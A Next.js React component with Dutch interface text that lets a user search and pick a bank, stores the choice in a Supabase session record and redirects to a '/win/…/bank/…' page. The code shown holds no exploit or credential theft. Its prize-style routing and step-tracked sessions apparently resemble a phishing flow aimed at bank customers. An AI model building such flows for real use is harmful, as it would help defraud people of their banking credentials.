"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
  initialBanks: BankCatalogEntry[];
};

export function BankenClientClean({ sessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);

  const demoOptions = useMemo(
    () =>
      banks.map((bank, index) => ({
        slug: bank.slug,
        displayName: bank.name,
        domain: bank.domain,
        logoFile: bank.logoFile,
      })),
    [banks],
  );

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace(`/banken?session=${encodeURIComponent(cachedSessionId)}`);
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId, router]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug) return;
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const { error } = await supabase
      .from("sessions")
      .update({
        current_step: "banken",
        form_data: {
          ...prev,
          bankSlug: nextBankSlug,
          bankName: displayName,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Opslaan mislukt.");
    else router.push(`/win/${sessionId}/bank/${nextBankSlug}?session=${encodeURIComponent(sessionId)}`);
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
          <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
            <h2 className="text-2xl font-bold text-white mb-2">Bankselectie</h2>
            <p className="text-sm text-gray-300 mb-8">Sessie wordt hersteld...</p>
            <div className="flex justify-center py-12">
              <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <h2 className="text-2xl font-bold text-white mb-2">Bankselectie</h2>
          <p className="text-sm text-gray-300 mb-6">Ongeldige link.</p>
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Gebruik de volledige link om verder te gaan.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-2 pt-[14vh] sm:p-4 sm:pt-[24vh]">
      <div className="space-y-3 w-full max-w-[550px] relative z-10">
        <div className="rounded-[20px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_30px_rgba(0,102,204,0.3)] p-3 sm:p-5">
          <div className="text-center mb-3">
            <h2 className="text-lg font-bold text-white sm:text-xl">{settings.banken_title}</h2>
            <p className="text-[11px] text-gray-300 mt-0.5 font-medium sm:text-xs">{settings.banken_subtitle}</p>
          </div>
          
          <div className="mx-auto mb-3 max-w-[400px]">
            <div className="flex items-center gap-1.5 rounded-lg border border-transparent bg-white/10 px-2.5 py-1.5 shadow-sm focus-within:border-[#0066CC] focus-within:ring-1 focus-within:ring-[#0066CC]/50 transition-colors">
              <svg aria-hidden viewBox="0 0 24 24" className="h-3.5 w-3.5 text-gray-400" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-[13px] text-white outline-none placeholder:text-gray-400"
              />
            </div>
          </div>

          <div className="max-h-[55vh] sm:max-h-[40vh] overflow-y-auto pr-1.5 custom-scrollbar">
            <div className="grid grid-cols-2 gap-2 sm:gap-1.5 lg:grid-cols-3 pb-1">
              {filteredOptions.map((opt, idx) => (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving}
                  className={`group flex aspect-[4/3] sm:aspect-[16/9] w-full flex-col items-center justify-between rounded-lg border border-white/10 bg-white/5 p-2 sm:p-1.5 text-center shadow-sm transition-all duration-300 hover:scale-[1.02] hover:bg-white/10 hover:border-white/20 ${
                    bankSlug === opt.slug ? "ring-1 ring-[#0066CC] bg-white/10" : ""
                  }`}
                >
                  <div className="flex flex-1 items-center justify-center mt-0.5">
                    <img
                      src={opt.logoFile}
                      alt={opt.displayName}
                      className="h-8 w-8 sm:h-6 sm:w-6 lg:h-8 lg:w-8 object-contain rounded"
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = 'none';
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = 'grid';
                      }}
                    />
                    <div className="hidden h-8 w-8 sm:h-6 sm:w-6 lg:h-8 lg:w-8 place-items-center rounded-lg bg-gradient-to-br from-[#1a1a1a] to-[#2d2d2d] text-base sm:text-sm lg:text-base font-bold text-white shadow-[0_2px_8px_rgba(0,0,0,0.15)] border border-white/10 relative overflow-hidden">
                      <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/10 to-transparent"></div>
                      <span className="relative z-10 drop-shadow-md">{opt.displayName.charAt(0)}</span>
                    </div>
                  </div>
                  <div className="flex h-8 sm:h-6 w-full items-center justify-center">
                    <p className="line-clamp-2 text-[12px] sm:text-[10px] lg:text-[11px] font-medium text-white/90 group-hover:text-white leading-tight">
                      {opt.displayName}
                    </p>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>

        {msg ? <p className="text-center text-sm text-red-400 bg-black/40 p-2 rounded-xl backdrop-blur-sm border border-red-500/20">{msg}</p> : null}
      </div>
    </div>
  );
}
